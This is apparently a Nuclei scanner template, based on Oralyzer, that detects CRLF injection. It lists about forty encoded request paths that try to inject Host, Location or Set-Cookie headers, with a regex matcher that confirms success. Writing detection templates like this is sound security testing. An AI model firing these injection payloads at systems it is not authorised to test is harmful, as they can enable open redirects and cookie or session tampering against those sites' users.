id: crlf-extended
info:
  name: CRLF Injection Detection inspired by Oralyzer
  author: roninja
  severity: low
  description: CRLF extended from Oralyzer
  reference:
    - https://github.com/r0075h3ll/Oralyzer/blob/master/core/crlf.py
  tags: crlf, crlf-ext, roninja-crlf, generic
  metadata:
    max-request: 8
http:
  - method: GET
    path:
      - "{{BaseURL}}/%0d%0ahost:%20www.google.com"
      - "{{BaseURL}}/%0d%0ahost:%20www.google.com%0d%0a"
      - "{{BaseURL}}/%5Cr%5Cnhost:%20www.google.com%5Cr%5Cn"
      - "{{BaseURL}}/%0d%0aLocation:www.google.com%0d%0a"
      - "{{BaseURL}}/%0d%0aSet-Cookie:roninja=roninja;"
      - "{{BaseURL}}/%5Cr%5Cn%5CtSet-Cookie:roninja=roninja;"
      - "{{BaseURL}}/%5Cr%5CtSet-Cookie:roninja=roninja;"
      - "{{BaseURL}}/%E5%98%8A%E5%98%8DLocation:www.google.com"
      - "{{BaseURL}}/%5CrSet-Cookie:roninja=roninja;"
      - "{{BaseURL}}/%5Cr%20Set-Cookie:roninja=roninja;"
      - "{{BaseURL}}/%5Cr%5CnSet-Cookie:roninja=roninja;"
      - "{{BaseURL}}/%5Cr%5Cn%20Set-Cookie:roninja=roninja;"
      - "{{BaseURL}}/%5CrSet-Cookie:roninja=roninja;"
      - "{{BaseURL}}/%u000ASet-Cookie:roninja=roninja;"
      - "{{BaseURL}}/%5Cr%20Set-Cookie:roninja=roninja;"
      - "{{BaseURL}}/%23%0D%0ALocation:www.google.com;"
      - "{{BaseURL}}/%5Cr%5CnSet-Cookie:roninja=roninja;"
      - "{{BaseURL}}/%5Cr%5Cn%20Set-Cookie:roninja=roninja;"
      - "{{BaseURL}}/%5Cr%5Cn%5CtSet-Cookie:roninja=roninja;"
      - "{{BaseURL}}/%5Cr%5CtSet-Cookie:roninja=roninja;"
      - "{{BaseURL}}/%5cr%5cnLocation:www.google.com"
      - "{{BaseURL}}/%E5%98%8A%E5%98%8D%0D%0ASet-Cookie:roninja=roninja;"
      - "{{BaseURL}}/%5CrSet-Cookie:roninja=roninja;"
      - "{{BaseURL}}/%5Cr%20Set-Cookie:roninja=roninja;"
      - "{{BaseURL}}/%5Cr%5CnSet-Cookie:roninja=roninja;"
      - "{{BaseURL}}/%5Cr%5Cn%20Set-Cookie:roninja=roninja;"
      - "{{BaseURL}}/%5Cr%5Cn%5CtSet-Cookie:roninja=roninja;"
      - "{{BaseURL}}/%5Cr%5CtSet-Cookie:roninja=roninja;"
      - "{{BaseURL}}/\r\nhost:%20www.google.com\r\n"
      - "{{BaseURL}}/\r\n\tSet-Cookie:roninja=roninja;"
      - "{{BaseURL}}/\r\nSet-Cookie:roninja=roninja;"
      - "{{BaseURL}}/\r\n%20Set-Cookie:roninja=roninja;"
      - "{{BaseURL}}/\r\n\tSet-Cookie:roninja=roninja;"
      - "{{BaseURL}}/\r\tSet-Cookie:roninja=roninja;"
      - "{{BaseURL}}/\r\nLocation:www.google.com"
      - "{{BaseURL}}/\rSet-Cookie:roninja=roninja;"
      - "{{BaseURL}}/\r%20Set-Cookie:roninja=roninja;"
      - "{{BaseURL}}/\r\nSet-Cookie:roninja=roninja;"
      - "{{BaseURL}}/\r\n%20Set-Cookie:roninja=roninja;"
      - "{{BaseURL}}/\r\n\tSet-Cookie:roninja=roninja;"
      - "{{BaseURL}}/\r\tSet-Cookie:roninja=roninja;"
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - '(?m)^(?:(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)(?:[a-zA-Z0-9\-_\.@]*)www\.google\.com\/?(\/|[^.].*)?$|(?:(?:Set-Cookie\s*?:(?:\s*?|.*?;\s*?))(roninja=roninja)(?:\s*?)(?:$|;)))'
        part: header
      - type: status
        status:
          - 200
          - 201
          - 202
          - 204
          - 205
          - 206
          - 207
          - 301
          - 302
          - 307
          - 308
        condition: or
